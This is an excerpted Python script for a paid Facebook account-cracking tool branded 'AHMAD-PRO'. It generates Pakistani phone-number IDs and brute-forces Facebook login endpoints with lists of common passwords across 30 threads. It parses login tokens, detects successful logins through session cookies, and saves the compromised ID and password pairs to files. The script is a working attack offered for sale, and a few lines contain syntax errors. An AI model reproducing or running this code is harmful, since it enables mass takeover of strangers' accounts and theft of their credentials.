...
gt = random.choice['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
...
----------------------------------------------
 Author    : AHMAD MALIK
 Github    : NA MUNNA NA NZAR LAG JATI HAI
 Facebook  : AHMAD
 Whatsapp  : +923056673626
 Tool Name : AHMAD-PRO(PAID)
 Type type : PAID
 (300 Rs or 10$ for 30 days)
 Version   : 2.0.0
 Note: Key will be approved again afetr pavement
----------------------------------------------
 AHMAD Pro version 2.0.0
 For Users: ENJOY THE PAID TOOLS🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def public():
        ...
        for met in range(jum):
                ...
                usrr.append(kl)
        linex()
        print(' All Methods are working try 1 by 1 ')
        linex()
        print(' [1] Method 1 (for new idz)\n [2] Method 2 (for old idz)\n [3] Method 3 (for old+new idz)\n')
        linex()
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up or if no result\033[1;37m")
                        linex()
                        for user in id:
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File Cloning\n [2] Create ids file\n [3] Public Cloning(login required)\n [4] Random Number Cloning\n [5] Random Gmail Crack\n [6] WhatsApp Group (soon)\n [7] Download Vpn\n [8] How To Use Video(error)\n [0] Exit menu')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' All Methods working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 (for new idz) \n [2] Method 2 (for old idz)\n [3] Method 3 (for old+new idz)')
                                linex()
                                mthd=input(' Choose: ')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up of if no result\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                ...
                                clear()
                                print(' [1] Pakistan Cloning(updated)\n [2] Bangladesh Cloning\n [3] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                ...
                                os.system('xdg-open https://mediafire.com/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print("\033[1;31m You are Not Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923056673626&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ahmad Sir, I Need To Buy Your Paid ahmad PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ahmad.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0302,0306,0315,0335,0345')
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ahmad:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up or if no result\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                ahmad.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ahmad-xd] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        ahmad=session.cookies.get_dict().keys()
                        if "c_user" in ahmad:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ahmad-ok] %s | %s'%(ids,pas))
                                open('/sdcard/ahmad-ok.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ahmad:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ahmad-cp] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ahmad-cp.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ahmad-ok] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ahmad-ok.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
